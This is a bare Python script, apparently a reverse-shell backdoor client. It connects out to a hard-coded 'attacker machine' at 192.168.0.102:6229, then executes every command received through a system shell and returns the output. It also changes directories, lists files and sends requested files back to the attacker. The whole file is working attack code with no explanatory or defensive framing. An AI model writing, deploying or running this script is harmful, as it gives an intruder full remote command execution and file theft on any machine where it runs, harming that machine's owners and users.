#!/usr/bin/python
# imports here
import time
import os
import socket,subprocess
HOST = '192.168.0.102'    # The remote host
PORT = 6229           # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send("[*] Connection Established!")
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     if data.startswith("cdx2") == True:
          path = data[5:]
          os.chdir(path)         
     if data.startswith("dirt") == True:
          path =os.path.dirname(os.path.abspath('__file__'))
          dirt= os.listdir(path)
          str1 = ''.join(str(e+' \n') for e in dirt)
          s.send(str1)
          s.send("EOFEOFEOFEOFEOFX")
          
     if data.startswith("download") == True:
          sendFile = data[9:]
          with open(sendFile, 'rb') as f:
               while sendFile:
                    filedata = f.read()
                    if filedata ==  '':break
                    s.send(filedata)
                    s.send("EOFEOFEOFEOFEOFX")
          f.close()
          
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
 
